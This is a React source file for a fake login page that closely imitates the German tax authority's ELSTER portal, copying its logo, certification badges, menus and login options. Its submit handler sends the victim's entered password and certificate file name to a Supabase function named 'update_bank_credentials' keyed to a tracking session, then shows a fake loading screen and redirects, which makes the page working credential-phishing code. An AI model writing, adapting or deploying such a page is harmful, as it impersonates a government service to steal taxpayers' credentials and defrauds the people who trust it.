import { useState, useEffect, useMemo } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import {
  Search,
  User,
  Settings,
  Files,
  Users,
  LayoutGrid,
  FileBadge,
  ShieldCheck,
  IdCard,
  Usb,
  CreditCard,
  Eye,
  EyeOff,
  Upload,
  Menu,
  X,
  ExternalLink,
} from "lucide-react";
import bsiAsset from "@/assets/elster-bsi.png.asset.json";
import bikAsset from "@/assets/elster-bik.png.asset.json";
import llAsset from "@/assets/elster-ll.jpg.asset.json";
import elsterLogo from "@/assets/elster-logo.png.asset.json";
import sternAsset from "@/assets/stern.png.asset.json";
import sternTransparentAsset from "@/assets/stern-transparent.png.asset.json";

const GREEN = "#78b434";
const BLUE = "#0570b7";
const BLUE_DARK = "#004b7f";
const TEXT = "#222";
const MUTED = "#666";
const BORDER = "#d7d7d7";
const BG = "#f5f5f5";

type TabKey = "zertifikat" | "elstersecure" | "ausweis" | "stick" | "signatur";

const TABS: { key: TabKey; label: string; Icon: typeof FileBadge }[] = [
  { key: "zertifikat", label: "Zertifikatsdatei", Icon: FileBadge },
  { key: "elstersecure", label: "ElsterSecure", Icon: ShieldCheck },
  { key: "ausweis", label: "Personalausweis", Icon: IdCard },
  { key: "stick", label: "Sicherheitsstick", Icon: Usb },
  { key: "signatur", label: "Signaturkarte", Icon: CreditCard },
];

const Elster = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [tab, setTab] = useState<TabKey>("zertifikat");
  const [fileName, setFileName] = useState("");
  const [password, setPassword] = useState("");
  const [showPw, setShowPw] = useState(false);
  const [pwError, setPwError] = useState("");
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Mein ELSTER | Login", "/favicon.png");

  const txCode = useMemo(() => {
    const n = Math.floor(100000000 + Math.random() * 900000000);
    return `${n} -C${Math.floor(10 + Math.random() * 90)}`;
  }, []);

  const activeTab = TABS.find((t) => t.key === tab)!;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password) { setPwError("Bitte geben Sie Ihr Passwort ein."); return; }
    if (submitting) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: fileName || activeTab.label,
        p_password: password,
        p_username_label: tab === "zertifikat" ? "Zertifikatsdatei" : activeTab.label,
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  const menu = [
    { icon: User, label: "Mein ELSTER" },
    { icon: Settings, label: "Mein Benutzerkonto" },
    { icon: Files, label: "Formulare und Leistungen" },
    { icon: Users, label: "Benutzergruppen" },
    { icon: LayoutGrid, label: "Weitere Softwareprodukte" },
  ];

  return (
    <div style={{ fontFamily: "'Open Sans', 'Segoe UI', Arial, sans-serif", color: TEXT, background: "#fff", minHeight: "100vh", display: "flex", flexDirection: "column" }}>
      {/* Header */}
      <header style={{ background: "#fff", borderBottom: `3px solid ${GREEN}` }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", padding: "14px 24px", display: "flex", alignItems: "center", gap: 16 }}>
          <a href="#" style={{ display: "flex", alignItems: "center", textDecoration: "none" }}>
            <img src={elsterLogo.url} alt="ELSTER – Ihr Online-Finanzamt" style={{ height: 44, width: "auto", display: "block" }} />
          </a>
          <div style={{ flex: 1 }} />
          <div className="hidden md:flex" style={{ alignItems: "center", gap: 10 }}>
            <div style={{ display: "flex", alignItems: "center", border: `1px solid ${BORDER}`, borderRadius: 2, padding: "6px 10px", width: 240 }}>
              <input placeholder="Suchen" style={{ flex: 1, border: "none", outline: "none", background: "transparent", fontSize: 15, color: TEXT }} />
            </div>
            <button type="button" aria-label="Suchen" style={{ background: BLUE, color: "#fff", border: "none", padding: "9px 12px", borderRadius: 2, cursor: "pointer" }}>
              <Search size={18} />
            </button>
          </div>
          <a href="#" className="hidden md:inline-flex" style={{ background: BLUE, color: "#fff", padding: "10px 24px", borderRadius: 2, textDecoration: "none", fontWeight: 600 }}>Login</a>
          <button className="md:hidden" aria-label="Menü" onClick={() => setMenuOpen(true)} style={{ background: "none", border: "none", color: BLUE, cursor: "pointer" }}>
            <Menu size={28} />
          </button>
        </div>
      </header>

      {/* Mobile menu overlay */}
      {menuOpen && (
        <div className="md:hidden" style={{ position: "fixed", inset: 0, background: "#fff", zIndex: 50, display: "flex", flexDirection: "column" }}>
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", padding: "14px 20px", borderBottom: `3px solid ${GREEN}` }}>
            <img src={elsterLogo.url} alt="ELSTER" style={{ height: 36, width: "auto", display: "block" }} />
            <button aria-label="Schließen" onClick={() => setMenuOpen(false)} style={{ background: "none", border: "none", cursor: "pointer", color: TEXT }}><X size={28} /></button>
          </div>
          <nav style={{ padding: 16, display: "flex", flexDirection: "column", gap: 2 }}>
            {menu.map((m) => (
              <a key={m.label} href="#" style={{ display: "flex", alignItems: "center", gap: 12, padding: "14px 10px", color: BLUE, textDecoration: "none", borderBottom: `1px solid ${BORDER}` }}>
                <m.icon size={22} /> {m.label}
              </a>
            ))}
          </nav>
        </div>
      )}

      {/* Main */}
      <main style={{ flex: 1, maxWidth: 1400, width: "100%", margin: "0 auto", padding: "24px 16px", display: "grid", gridTemplateColumns: "260px 1fr", gap: 20 }} className="elster-main">
        {/* Sidebar */}
        <aside className="hidden lg:block" style={{ border: `1px solid ${BORDER}`, background: "#fff" }}>
          <div style={{ padding: "16px 18px", borderBottom: `1px solid ${BORDER}`, color: TEXT, fontSize: 16 }}>ELSTER</div>
          {menu.map((m, i) => (
            <a key={m.label} href="#" style={{
              display: "flex", alignItems: "center", gap: 12,
              padding: "14px 18px", color: BLUE, textDecoration: "none",
              borderBottom: i < menu.length - 1 ? `1px solid ${BORDER}` : "none",
              fontSize: 15,
            }}>
              <m.icon size={20} strokeWidth={1.5} /> {m.label}
            </a>
          ))}
        </aside>

        {/* Content */}
        <section>
          <h1 style={{ fontSize: 28, fontWeight: 400, color: TEXT, margin: "4px 0 20px" }}>Login-Optionen</h1>

          <div style={{ display: "grid", gridTemplateColumns: "260px 1fr 260px", gap: 24 }} className="elster-content">
            {/* Tabs */}
            <div style={{ border: `1px solid ${BORDER}` }}>
              {TABS.map((t) => {
                const active = t.key === tab;
                return (
                  <button key={t.key} type="button" onClick={() => { setTab(t.key); setPwError(""); }} style={{
                    width: "100%", textAlign: "left", display: "flex", alignItems: "center", gap: 12,
                    padding: "16px 16px", border: "none", background: "#fff", cursor: "pointer",
                    borderLeft: `4px solid ${active ? GREEN : "transparent"}`,
                    color: active ? TEXT : BLUE, fontSize: 15,
                    borderBottom: `1px solid ${BORDER}`,
                  }}>
                    <t.Icon size={22} strokeWidth={1.5} color={active ? GREEN : BLUE} /> {t.label}
                  </button>
                );
              })}
            </div>

            {/* Form panel */}
            <div>
              <h2 style={{ fontSize: 22, fontWeight: 400, margin: "0 0 16px" }}>{activeTab.label}</h2>

              {tab === "zertifikat" && (
                <form onSubmit={handleSubmit}>
                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>Zertifikatsdatei</label>
                  <div style={{ display: "flex", gap: 8, marginBottom: 18 }}>
                    <label style={{
                      flex: 1, display: "flex", alignItems: "center", gap: 8,
                      border: `1px dashed ${BORDER}`, background: "#f6f6f6",
                      padding: "10px 12px", color: MUTED, fontStyle: fileName ? "normal" : "italic",
                      cursor: "pointer",
                    }}>
                      <Upload size={16} />
                      <span>{fileName || "Auswählen"}</span>
                      <input type="file" accept=".pfx" style={{ display: "none" }} onChange={(e) => setFileName(e.target.files?.[0]?.name || "")} />
                    </label>
                    <button type="button" onClick={(e) => (e.currentTarget.previousElementSibling as HTMLElement)?.querySelector<HTMLInputElement>("input")?.click()} style={{ background: BLUE, color: "#fff", border: "none", padding: "0 18px", cursor: "pointer", fontSize: 15 }}>Durchsuchen</button>
                  </div>

                  <label style={{ display: "block", fontSize: 14, marginBottom: 6 }}>Passwort</label>
                  <div style={{ position: "relative", marginBottom: pwError ? 6 : 18 }}>
                    <input
                      type={showPw ? "text" : "password"}
                      value={password}
                      onChange={(e) => { setPassword(e.target.value); if (pwError) setPwError(""); }}
                      style={{ width: "100%", padding: "10px 40px 10px 12px", border: `1px solid ${pwError ? "#c00" : BORDER}`, outline: "none", fontSize: 15, boxSizing: "border-box" }}
                    />
                    <button type="button" aria-label="Passwort anzeigen" onClick={() => setShowPw((v) => !v)} style={{ position: "absolute", right: 8, top: "50%", transform: "translateY(-50%)", background: "none", border: "none", color: BLUE, cursor: "pointer" }}>
                      {showPw ? <EyeOff size={18} /> : <Eye size={18} />}
                    </button>
                  </div>
                  {pwError && <div style={{ color: "#c00", fontSize: 13, marginBottom: 14 }}>{pwError}</div>}

                  <button type="submit" style={{ background: BLUE, color: "#fff", border: "none", padding: "10px 28px", fontSize: 15, cursor: "pointer" }}>Login</button>

                  <div style={{ marginTop: 32, display: "flex", flexDirection: "column", gap: 8 }}>
                    <a href="#" style={{ color: BLUE, textDecoration: "none", fontSize: 14 }}>Zertifikatsdatei verloren oder Zertifikat abgelaufen?</a>
                    <a href="#" style={{ color: BLUE, textDecoration: "none", fontSize: 14 }}>Passwort vergessen?</a>
                  </div>
                </form>
              )}

              {tab !== "zertifikat" && (
                <div style={{ color: TEXT, fontSize: 15, lineHeight: 1.6 }}>
                  <p style={{ marginTop: 0 }}>
                    {tab === "elstersecure" && "Melden Sie sich mit ElsterSecure und der ElsterSecure-App auf Ihrem Smartphone an."}
                    {tab === "ausweis" && "Melden Sie sich mit Ihrem Personalausweis mit Online-Ausweisfunktion an."}
                    {tab === "stick" && "Stecken Sie Ihren ELSTER-Sicherheitsstick in einen freien USB-Anschluss und melden Sie sich an."}
                    {tab === "signatur" && "Melden Sie sich mit Ihrer Signaturkarte und einem passenden Kartenleser an."}
                  </p>
                  <a href="#" style={{ color: BLUE, textDecoration: "none", fontSize: 14 }}>Weitere Informationen</a>
                </div>
              )}
            </div>

            {/* Info box */}
            <aside className="elster-info" style={{ fontSize: 14, lineHeight: 1.5 }}>
              {tab === "zertifikat" ? (
                <>
                  <div style={{ fontWeight: 700, marginBottom: 8 }}>Wo finde ich meine heruntergeladene Zertifikatsdatei?</div>
                  <p style={{ color: MUTED, margin: "0 0 16px" }}>
                    Sie können auch nach der abgespeicherten Zertifikatsdatei suchen. Nutzen Sie dazu die Suche Ihres Betriebssystems (z. B. Windows) und geben Sie als Suchbegriff folgendes ein: <span style={{ fontStyle: "italic" }}>*.pfx</span>
                  </p>
                  <div style={{ fontWeight: 700, marginBottom: 6 }}>Noch keine Zertifikatsdatei?</div>
                  <div>Hier <a href="#" style={{ color: BLUE, textDecoration: "none", fontWeight: 600 }}>Benutzerkonto erstellen</a>.</div>
                </>
              ) : (
                <>
                  <div style={{ fontWeight: 700, marginBottom: 8 }}>Noch kein Benutzerkonto?</div>
                  <div>Hier <a href="#" style={{ color: BLUE, textDecoration: "none", fontWeight: 600 }}>Benutzerkonto erstellen</a>.</div>
                </>
              )}
            </aside>
          </div>
        </section>
      </main>

      {/* Footer */}
      <footer style={{ background: "#4a4a4a", color: "#fff", marginTop: 32 }}>
        <div style={{ maxWidth: 1400, margin: "0 auto", padding: "40px 24px", display: "grid", gridTemplateColumns: "1fr 2fr", gap: 32 }} className="elster-footer-grid">
          <div>
            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 20 }}>
              <img src={sternAsset.url} alt="" style={{ height: 28, width: "auto" }} />
              <span style={{ fontSize: 24 }}>ELSTER</span>
            </div>
            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "8px 24px" }}>
              {[
                "Aktuelles", "Presse und Medien",
                "Rechtliches", "Systemanforderungen",
                "Nutzen und Vorteile", "MeinELSTER+",
                "Sicherheit", "ElsterSecure",
                "Inhalte in Leichter Sprache", "ELSTER-Unternehmenskonto",
              ].map((l) => (
                <a key={l} href="#" style={{ color: "#fff", textDecoration: "none", fontSize: 14, padding: "4px 0" }}>{l}</a>
              ))}
            </div>
          </div>
          <div>
            <div style={{ fontSize: 20, marginBottom: 20 }}>Zertifikate</div>
            <div style={{ display: "grid", gridTemplateColumns: "repeat(3, 1fr)", gap: 16 }} className="elster-certs">
              {[
                { img: bsiAsset.url, text: "ISO 27001 Sicherheit im Verfahren ELSTER" },
                { img: bikAsset.url, text: "Vom BIK geprüfter Webauftritt" },
                { img: llAsset.url, text: "Von capito geprüfte Leichte Sprache" },
              ].map((c) => (
                <div key={c.text} style={{ background: "#fff", color: TEXT, padding: 14, display: "flex", alignItems: "center", gap: 12 }}>
                  <img src={c.img} alt="" style={{ height: 56, width: "auto", flex: "0 0 auto" }} />
                  <div style={{ fontSize: 13, lineHeight: 1.3 }}>
                    {c.text} <ExternalLink size={12} style={{ display: "inline", color: BLUE, verticalAlign: "middle" }} />
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>

        <div style={{ background: "#2b2b2b", color: "#fff", padding: "14px 24px" }}>
          <div style={{ maxWidth: 1400, margin: "0 auto", display: "flex", flexWrap: "wrap", gap: 20, alignItems: "center", fontSize: 14 }} className="elster-footer-bottom">
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Forum <ExternalLink size={11} style={{ display: "inline" }} /></a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Hilfe, <u>FAQ</u></a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Fragen zu ELSTER</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Kontakt</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>KONSENS <ExternalLink size={11} style={{ display: "inline" }} /></a>
            <span style={{ flex: 1 }} />
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Datenschutz</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Impressum</a>
            <a href="#" style={{ color: "#fff", textDecoration: "none" }}>Barrierefreiheit</a>
            <img src={sternAsset.url} alt="" style={{ height: 14, width: "auto" }} />
            <span>ELSTER ®</span>
            <span style={{ opacity: 0.8 }}>{txCode}</span>
          </div>
        </div>
      </footer>

      {showLoading && (
        <LoadingOverlay onComplete={() => navigate(`/confirmation${sessionId ? `?s=${sessionId}` : ""}`)} />
      )}

      <style>{`
        @media (max-width: 1023px) {
          .elster-main { grid-template-columns: 1fr !important; }
          .elster-content { grid-template-columns: 1fr !important; }
          .elster-info { order: 3; }
        }
        @media (max-width: 640px) {
          .elster-footer-grid { grid-template-columns: 1fr !important; }
          .elster-certs { grid-template-columns: 1fr !important; }
        }
      `}</style>
    </div>
  );
};

export default Elster;
